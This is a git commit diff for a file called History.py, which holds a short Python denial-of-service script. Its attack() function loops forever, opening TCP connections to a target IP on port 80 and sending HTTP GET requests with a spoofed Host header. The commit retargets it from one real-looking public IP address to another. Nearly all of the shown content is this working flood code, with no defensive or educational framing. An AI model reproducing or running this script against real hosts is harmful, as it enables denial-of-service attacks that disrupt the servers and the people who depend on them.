daff4ebae03b75dbe8a5cc5c7372b711d9f60fca
Tshepo Molaoa <51974901+Tshepo-14@users.noreply.github.com>
2023-11-30 14:44:27 +0200

    Update History.py

--- History.py
+++ History.py
@@ -2,8 +2,8 @@
 import socket
 import threading
 
-target = '23.227.38.32.'
-fake_ip = '154.0.172.181'
+target = '154.0.172.181'
+fake_ip = '154.0.172.190'
 #make sure fake ip is alive and target 
 port = 80
 i=1
@@ -12,7 +12,7 @@ def attack():
     while True:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((target, port))
-        #example 23.227.38.32:80 should also be alive
+        #example 154.0.172.181:80 should also be alive
         s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
         #s.sendto(("POST /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
         s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
